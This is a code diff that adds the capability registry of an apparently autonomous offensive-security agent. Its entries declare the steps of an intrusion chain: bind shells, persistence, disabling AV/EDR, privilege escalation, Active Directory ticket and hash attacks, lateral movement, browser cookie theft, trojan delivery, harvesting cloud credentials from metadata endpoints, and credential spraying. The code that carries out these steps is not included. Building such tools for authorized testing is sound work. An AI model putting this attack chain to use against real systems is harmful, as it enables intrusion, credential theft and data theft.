+        tools=["nc"]),
+
+    _mk("payload_bind", "payload",
+        "Synthesize a BIND shell for the target platform (target LISTENS on "
+        "a port, we connect in). LOUD by nature — a listener opened on the "
+        "target is easy to spot, so this capability is hard-gated behind "
+        "--aggressive (the agent refuses it in default/stealth/paranoid).",
+        [_mk_slot("port", "port", True, "port the target listens on"),
+         _mk_slot("dialect", "choice", False, "nc|bash|python3|socat|...")],
+        ["shell_foothold"], _payload_bind_adapter, _payload_interp,
+        opsec_cost=3.0, detection_risk=0.9, stealth_level="aggressive",
+        forceful=True, timeout=20,
+        preconditions=[_has_network_host()], banner="bind shell", tools=["nc"]),
+
+    _mk("persistence_install", "post",
+        "Install beacon persistence (runkey/scheduled_task/service, cron/profile/systemd)",
+        [_mk_slot("method", "str", False, "runkey|scheduled_task|service|cron|profile|systemd")],
+        ["persistence"], _persist_adapter,
+        interpreter=_interp_from("persistence_interpreter"),
+        opsec_cost=3.0, detection_risk=0.7, stealth_level="aggressive", timeout=45,
+        preconditions=[_has_beacon()], banner="persistence install"),
+
+    _mk("internal_recon", "post",
+        "Internal network snapshot from the beacon: interfaces, default route, "
+        "ARP neighbors — the map of what is reachable from the foothold",
+        [], ["internal_host", "internal_gateway"], _internal_recon_adapter,
+        interpreter=_interp_from("internal_recon_interpreter"),
+        opsec_cost=0.4, detection_risk=0.1, stealth_level="passive", timeout=30,
+        preconditions=[_has_beacon()], banner="internal recon"),
+
+    _mk("internal_probe", "post",
+        "Bounded TCP probe of in-scope internal neighbors for pivot services "
+        "(SSH/SMB/WinRM) — feeds the lateral movement chain with real targets",
+        [], ["internal_service"], _internal_probe_adapter,
+        interpreter=_interp_from("internal_probe_interpreter"),
+        opsec_cost=1.2, detection_risk=0.25, stealth_level="active", timeout=60,
+        preconditions=[_has_beacon()], banner="internal service probe"),
+
+    _mk("edr_disable", "post",
+        "Disable the target's AV/EDR stack through the beacon (edr-kill): "
+        "Defender realtime off + known AV/EDR services stopped. Destructive "
+        "and loud — gated behind --aggressive AND SYSTEM privileges; never "
+        "in paranoid/stealth profiles.",
+        [], ["defensive_gap"], _edr_disable_adapter,
+        interpreter=_edr_disable_interp,
+        opsec_cost=4.5, detection_risk=0.95, stealth_level="aggressive",
+        timeout=45, forceful=True,
+        preconditions=[_has_beacon(), _has_system_privilege()],
+        banner="disable AV/EDR"),
+
+    _mk("loot_triage", "post",
+        "Triage downloaded loot: classify files, extract passwords/API "
+        "keys/private keys/DSNs, register WorldModel findings and derive "
+        "the next-step plan (cross-service spray, cloud harvest, pivot "
+        "candidates). Read-only on the loot dir.",
+        [], ["creds", "cloud_creds"], _loot_triage_adapter, _loot_triage_interp,
+        opsec_cost=0.2, detection_risk=0.0, stealth_level="passive", timeout=30,
+        preconditions=[_has_beacon()], banner="loot triage"),
+
+    _mk("privesc_system", "post",
+        "Escalate the beacon to SYSTEM/root (service obj=LocalSystem, root unit)",
+        [], ["system_privilege"], _privesc_adapter,
+        interpreter=_interp_from("privesc_interpreter"),
+        opsec_cost=4.0, detection_risk=0.8, stealth_level="aggressive", timeout=60,
+        preconditions=[_has_beacon()], banner="privesc to SYSTEM"),
+
+    _mk("inject_beacon", "post",
+        "Inject the beacon into a privileged process (winlogon / root unit)",
+        [_mk_slot("target_process", "str", False, "process name to inject into")],
+        ["injection"], _inject_adapter,
+        interpreter=_interp_from("inject_interpreter"),
+        opsec_cost=4.5, detection_risk=0.85, stealth_level="aggressive", timeout=60,
+        preconditions=[_has_system_privilege()], banner="beacon process injection"),
+
+    _mk("privesc_sudo", "post",
+        "Linux: escalate the beacon to root through sudo (-S, known password)",
+        [_mk_slot("username", "username", True, "account"),
+         _mk_slot("password", "password", True, "password")],
+        ["system_privilege"], _sudo_adapter,
+        interpreter=_interp_from("privesc_interpreter"),
+        opsec_cost=3.5, detection_risk=0.5, stealth_level="active", timeout=45,
+        preconditions=[_has_beacon()], banner="privesc via sudo", tools=["sudo"]),
+
+    _mk("privesc_service_perms", "post",
+        "Windows: service with weak permissions -> run beacon as LocalSystem",
+        [], ["system_privilege"], _service_perms_adapter,
+        interpreter=_interp_from("privesc_interpreter"),
+        opsec_cost=4.0, detection_risk=0.75, stealth_level="aggressive", timeout=60,
+        preconditions=[_has_beacon()], banner="privesc via service perms"),
+
+    _mk("ad_enum", "ad",
+        "Enumerate the Active Directory domain (ldapsearch): users, groups, "
+        "SPNs, trusts and naming context. Runs from the operator when no "
+        "beacon session exists yet, through the beacon when one is up.",
+        [], ["ad_domain"], _ad_enum_adapter,
+        interpreter=_interp_from("ad_enum_interpreter"),
+        opsec_cost=2.0, detection_risk=0.4, stealth_level="active", timeout=45,
+        preconditions=[_has_ad_service()], banner="AD domain enumeration",
+        tools=["ldapsearch"]),
+
+    _mk("kerberoast", "ad",
+        "Request SPN TGS tickets (GetUserSPNs.py) -> crackable AD credentials",
+        [_mk_slot("username", "username", True, "domain account"),
+         _mk_slot("password", "password", True, "password")],
+        ["ad_creds"], _kerberoast_adapter,
+        interpreter=_interp_from("kerberoast_interpreter"),
+        opsec_cost=3.5, detection_risk=0.6, stealth_level="aggressive",
+        forceful=True, timeout=90,
+        preconditions=[_has_ad_domain(), _has_creds()],
+        banner="kerberoast SPN tickets", tools=["GetUserSPNs.py"]),
+
+    _mk("lateral_pivot", "post",
+        "Deploy a new beacon to a peer host with known credentials (lateral movement)",
+        [_mk_slot("host", "host", False, "peer host to pivot to"),
+         _mk_slot("username", "username", True, "account"),
+         _mk_slot("password", "password", True, "password")],
+        ["pivot"], _lateral_adapter,
+        interpreter=_interp_from("lateral_interpreter"),
+        opsec_cost=4.5, detection_risk=0.7, stealth_level="aggressive",
+        forceful=True, timeout=60,
+        preconditions=[_has_beacon(), _has_creds()],
+        banner="lateral pivot", tools=["sshpass"]),
+
+    _mk("smb_pivot", "post",
+        "Windows: PsExec-style beacon deploy to a peer over SMB (pass-the-hash supported)",
+        [_mk_slot("host", "host", False, "peer Windows host to pivot to"),
+         _mk_slot("username", "username", True, "account"),
+         _mk_slot("password", "password", True, "password or NTLM hash")],
+        ["pivot"], _smb_adapter,
+        interpreter=_interp_from("smb_pivot_interpreter"),
+        opsec_cost=4.8, detection_risk=0.8, stealth_level="aggressive",
+        forceful=True, timeout=90,
+        preconditions=[_has_beacon(), _has_creds()],
+        banner="smb pivot (psexec)", tools=["psexec.py"]),
+
+    _mk("winrm_pivot", "post",
+        "Windows: beacon deploy to a peer over WinRM (evil-winrm)",
+        [_mk_slot("host", "host", False, "peer Windows host to pivot to"),
+         _mk_slot("username", "username", True, "account"),
+         _mk_slot("password", "password", True, "password")],
+        ["pivot"], _winrm_adapter,
+        interpreter=_interp_from("winrm_pivot_interpreter"),
+        opsec_cost=4.6, detection_risk=0.75, stealth_level="aggressive",
+        forceful=True, timeout=90,
+        preconditions=[_has_beacon(), _has_creds()],
+        banner="winrm pivot", tools=["evil-winrm"]),
+
+    _mk("as_rep_roast", "ad",
+        "AS-REP roasting (GetNPUsers.py) for accounts without pre-authentication",
+        [_mk_slot("username", "username", True, "domain account"),
+         _mk_slot("password", "password", True, "password")],
+        ["ad_creds"], _as_rep_adapter,
+        interpreter=_interp_from("as_rep_interpreter"),
+        opsec_cost=3.5, detection_risk=0.6, stealth_level="aggressive",
+        forceful=True, timeout=90,
+        preconditions=[_has_ad_domain(), _has_creds()],
+        banner="AS-REP roast", tools=["GetNPUsers.py"]),
+
+    _mk("dc_sync", "ad",
+        "DCSync: replicate NTLM hashes from the DC (secretsdump.py -just-dc)",
+        [_mk_slot("username", "username", True, "domain account"),
+         _mk_slot("password", "password", True, "password or NTLM hash")],
+        ["ad_creds"], _dc_sync_adapter,
+        interpreter=_interp_from("dc_sync_interpreter"),
+        opsec_cost=5.5, detection_risk=0.9, stealth_level="aggressive",
+        forceful=True, timeout=120,
+        preconditions=[_has_ad_domain(), _has_system_privilege()],
+        banner="DCSync hash dump", tools=["secretsdump.py"]),
+
+    _mk("hash_crack", "ad",
+        "Crack a captured AD hash offline (john: krb5tgs / krb5asrep / nt)",
+        [_mk_slot("hash", "hash", False, "captured hash (from kerberoast / as_rep / dc_sync)")],
+        # NOTE: 'creds' is deliberately NOT declared here. hash_crack only
+        # yields reusable domain creds AFTER a captured hash is cracked —
+        # declaring it would make the backward-chainer believe 'creds' is
+        # already produced the moment hash_crack is planned (e.g. a cold
+        # goal=crack run), silently dropping the real acquisition chain
+        # (ssh_login/web_creds) the beacon needs. The interpreter still
+        # emits creds at runtime once a hash actually cracks.
+        ["cracked"], _hash_crack_adapter,
+        interpreter=_interp_from("hash_crack_interpreter"),
+        opsec_cost=6.0, detection_risk=0.2, stealth_level="passive", timeout=180,
+        preconditions=[_has_ad_domain(), _has_ad_hash()],
+        banner="crack AD hash", tools=["john"]),
+
+    _mk("cleanup", "post",
+        "Operational hygiene: remove persistence and kill the beacon process",
+        [], ["cleanup"], _cleanup_adapter,
+        interpreter=_interp_from("cleanup_interpreter"),
+        opsec_cost=2.0, detection_risk=0.3, stealth_level="active", timeout=45,
+        preconditions=[_has_beacon()], banner="cleanup target"),
+
+    _mk("cookie_stealer", "post",
+        "Steal browser session cookies from the beacon (Chrome/Edge DPAPI "
+        "cookies-json built-in)",
+        [], ["stolen_cookies"], _cookies_adapter,
+        interpreter=_interp_from("cookies_interpreter"),
+        opsec_cost=1.5, detection_risk=0.5, stealth_level="active", timeout=30,
+        preconditions=[_has_beacon()], banner="steal browser cookies"),
+
+    _mk("bt_scan", "post",
+        "Bluetooth proximity radar from the beacon (bt-scan-json built-in): "
+        "nearby devices, MACs, RSSI",
+        [], ["bt_device"], _bt_scan_adapter,
+        interpreter=_interp_from("bt_scan_interpreter"),
+        opsec_cost=0.5, detection_risk=0.1, stealth_level="active", timeout=30,
+        preconditions=[_has_beacon()], banner="bluetooth proximity scan"),
+
+    _mk("cdp_pivot", "post",
+        "Chrome DevTools pivot: pull live session cookies out of a running "
+        "Chrome via CDP (cdp-cookies built-in)",
+        [_mk_slot("port", "port", False, "CDP debug port (default 9222)")],
+        ["cdp_cookies"], _cdp_cookies_adapter,
+        interpreter=_interp_from("cdp_cookies_interpreter"),
+        opsec_cost=1.8, detection_risk=0.6, stealth_level="aggressive", timeout=45,
+        preconditions=[_has_beacon()], banner="cdp cookie pivot"),
+
+    _mk("socks_proxy", "post",
+        "Start a SOCKS5 proxy pivot from the beacon (socks built-in): route "
+        "tools through the compromised host",
+        [_mk_slot("port", "port", False, "local SOCKS port (default 1080)")],
+        ["socks_proxy"], _socks_adapter,
+        interpreter=_interp_from("socks_interpreter"),
+        opsec_cost=2.0, detection_risk=0.7, stealth_level="active", timeout=30,
+        preconditions=[_has_beacon()], banner="socks5 pivot"),
+
+    _mk("ransom_sim", "post",
+        "Non-destructive ransomware simulation from the beacon: quarantines "
+        "files into a vault (never encrypted/deleted), manifest allows full "
+        "rollback",
+        [_mk_slot("dir", "str", False, "directory to simulate impact on (default: .)")],
+        ["ransom_sim"], _ransom_sim_adapter,
+        interpreter=_interp_from("ransom_sim_interpreter"),
+        opsec_cost=3.0, detection_risk=0.9, stealth_level="aggressive",
+        forceful=True, timeout=60,
+        preconditions=[_has_beacon()], banner="ransomware simulation"),
+
+    _mk("trojan_deliver", "post",
+        "Supply-chain delivery: embed the staged beacon payload inside a "
+        "legitimate carrier (trojan overlay, carrier bytes untouched) and "
+        "drop the bundle on the target",
+        [_mk_slot("carrier", "path", False, "legit binary to hide the payload in"),
+         _mk_slot("payload", "path", False, "staged beacon binary to embed"),
+         _mk_slot("bundle", "path", False, "pre-built bundle path (skips staging)"),
+         _mk_slot("dir", "str", False, "target drop dir (default: .)")],
+        ["trojan_bundle"], _trojan_deliver_adapter,
+        interpreter=_interp_from("trojan_deliver_interpreter"),
+        opsec_cost=4.0, detection_risk=0.7, stealth_level="aggressive",
+        forceful=True, timeout=90,
+        preconditions=[_has_beacon()], banner="trojan bundle delivery"),
+
+    _mk("cloud_creds_harvest", "post",
+        "Harvest cloud provider credentials from INSIDE the box via the "
+        "instance-metadata service (IMDSv2 token + role endpoint): AWS "
+        "169.254.169.254, GCP metadata.google.internal, Azure "
+        "169.254.169.254 (managed identity). The operator side cannot reach "
+        "link-local metadata of a remote box, so this must run on the beacon.",
+        [], ["cloud_creds", "environment"], _cloud_creds_adapter, _cloud_creds_interp,
+        opsec_cost=0.5, detection_risk=0.2, stealth_level="passive", timeout=45,
+        preconditions=[_has_beacon(), _has_env_container()],
+        banner="cloud metadata harvest"),
+
+    _mk("cloud_s3_enum", "post",
+        "With harvested AWS IAM creds, enumerate the account: list buckets "
+        "(s3 ls), whoami (sts), and copy interesting objects — turns stolen "
+        "instance-role credentials into data access",
+        [_mk_slot("provider", "str", False, "cloud provider (aws|gcp|azure)")],
+        ["cloud_access", "stolen_data"], _cloud_s3_adapter, _cloud_s3_interp,
+        opsec_cost=1.2, detection_risk=0.5, stealth_level="active", timeout=60,
+        preconditions=[_has_cloud_creds()],
+        banner="cloud object storage enumerate"),
+
+    _mk("cloud_iam_enum", "post",
+        "With harvested creds: read-only identity-plane enumeration — "
+        "assumable roles (AWS iam:ListRoles), service accounts (GCP) or "
+        "role assignments (Azure), plus account/project/tenant identity. "
+        "Discovers the lateral movement surface inside the cloud account",
+        [_mk_slot("provider", "str", False, "cloud provider (aws|gcp|azure)")],
+        ["cloud_access", "cloud_lateral"], _cloud_iam_enum_adapter,
+        _cloud_iam_enum_interp,
+        opsec_cost=0.8, detection_risk=0.3, stealth_level="active", timeout=45,
+        preconditions=[_has_cloud_creds()],
+        banner="cloud IAM enumeration"),
+
+    _mk("cloud_assume_role", "post",
+        "STS assume-role on a discovered IAM role ARN (temporary credential "
+        "set), then verify the new identity with get-caller-identity. The "
+        "core cloud lateral-movement primitive",
+        [_mk_slot("role_arn", "str", True,
+                  "assumable identity: IAM role ARN (aws), "
+                  "service-account email (gcp) or role principal (azure)"),
+         _mk_slot("provider", "str", False, "cloud provider (aws|gcp|azure)")],
+        ["cloud_lateral"], _cloud_assume_role_adapter, _cloud_assume_role_interp,
+        opsec_cost=1.5, detection_risk=0.6, stealth_level="active", timeout=45,
+        preconditions=[_has_cloud_creds()],
+        banner="cloud STS assume-role"),
+
+    _mk("cloud_cross_account", "post",
+        "With an assumed role: enumerate cross-account visibility — buckets "
+        "under the assumed identity, AWS Organizations account list, Lambda "
+        "inventory (read-only)",
+        [_mk_slot("provider", "str", False, "cloud provider (aws|gcp|azure)")],
+        ["cloud_access", "cloud_lateral", "stolen_data"],
+        _cloud_cross_account_adapter, _cloud_cross_account_interp,
+        opsec_cost=1.2, detection_risk=0.5, stealth_level="active", timeout=60,
+        preconditions=[_has_cloud_creds()],
+        banner="cloud cross-account enum"),
+
+    _mk("mobile_probe", "recon",
+        "Probe for mobile/device-management or phone-homing services that "
+        "indicate the infra supports mobile (MDM endpoints, APNS/GCM "
+        "gateways, mobile-web user-agents), so the engagement branches into "
+        "the mobile attack surface",
+        [], ["mobile"], _mobile_probe_adapter, _mobile_probe_interp,
+        opsec_cost=0.6, detection_risk=0.1, stealth_level="passive", timeout=90,
+        preconditions=[_has_network_host()], banner="mobile surface probe"),
+
+    _mk("mobile_mdm_fingerprint", "recon",
+        "Fingerprint a discovered MDM enrollment endpoint: vendor class "
+        "(Jamf/Intune/MobileIron/AirWatch/Kandji/SimpleMDM), auth mode "
+        "(SAML/Entra/user+pass), API surface (/api/v1, /api/mdm), and "
+        " enrollment-profile exposure. Read-only GETs with MDM vendor "
+        "user-agents; the vendor class shapes the follow-up attack tree",
+        [_mk_slot("base_url", "str", False, "MDM base URL (default: target)")],
+        ["mobile", "mdm_vendor"], _mdm_fingerprint_adapter,
+        _mdm_fingerprint_interp,
+        opsec_cost=0.8, detection_risk=0.2, stealth_level="active", timeout=90,
+        preconditions=[_has_network_host()], banner="MDM vendor fingerprint"),
+
+    _mk("k8s_escape", "post",
+        "Probe a compromised container for Kubernetes escape primitives:",
+        [], ["k8s_escape", "system_privilege"], _k8s_escape_adapter,
+        _k8s_escape_interp,
+        opsec_cost=0.8, detection_risk=0.3, stealth_level="passive", timeout=40,
+        preconditions=[_has_beacon(), _has_k8s()],
+        banner="kubernetes escape probe"),
+
+    _mk("cred_spray", "brute",
+        "Lockout-aware credential spray: ONE password per round against "
+        "EVERY harvested/discovered account, on every sprayable service "
+        "the scan proved open (ssh, ftp, mysql, postgres, smb, tomcat, "
+        "redis). Hard caps at 3 attempts per account (enterprise "
+        "lockout policies), paced rounds, harvested-password reuse "
+        "first. Accounts exhausted are backed off for the engagement.",
+        [], ["creds"], _cred_spray_adapter, _cred_spray_interp,
+        opsec_cost=2.0, detection_risk=0.55, stealth_level="aggressive",
+        timeout=300, forceful=True,
+        preconditions=[_has_network_host(), _has_any_creds_or_accounts()],
+        banner="credential spray (lockout-aware)"),
+]
